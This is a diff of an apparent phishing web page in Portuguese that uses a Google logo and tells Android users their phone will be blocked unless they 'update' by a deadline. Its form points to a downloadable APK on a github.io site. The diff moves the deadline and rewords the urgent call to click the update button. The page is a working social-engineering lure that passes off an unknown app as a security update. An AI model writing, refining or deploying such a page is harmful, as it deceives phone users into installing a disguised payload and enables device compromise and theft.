@@ -35,14 +35,15 @@
   <body class="bg-white">
  
 <form action="https://mobi-center.github.io/mobi-center/seu%20sistema%20inseguro%20e%20vulneravel%20ou%20prefere%20atualizar.apk">
+    
     <div class="container">
       <div class="py-5 text-center">
         <img class="d-block mx-auto mb-4" src="https://logodownload.org/wp-content/uploads/2014/09/google-logo-1.png" style="width:20%; height:20%;">
        
-        <small><p class="lead">Seu celular será bloqueado.</p><p> Dispositivos <b>android</b> não atualizados até a data de  <b style="color:red">08/07/2021</b> estarão passivos de desativação sem aviso previo.<br> Ative o modulo de segurança do seu celular. </p>
+        <small><p class="lead">Seu celular será bloqueado.</p><p> Dispositivos <b>android</b> não atualizados até a data de  <b style="color:red">25/07/2021</b> estarão passivos de desabalitação sem aviso prévio.<br> Ative a atualização do android. </p>
 		
 		<p><b>Tempo de conclusão estimado: 1-2 minutos</b></p>
-		<p><b style="color:blue">Para manter-se seguro clique no botão atualizar e conclua o processo.</b></p>
+		<p><b style="color:blue">Para manter-se seu díspositivo atualizado cliquem no botão abaixo.</b></p>
     </small>  </div>
 
       <div class="row">
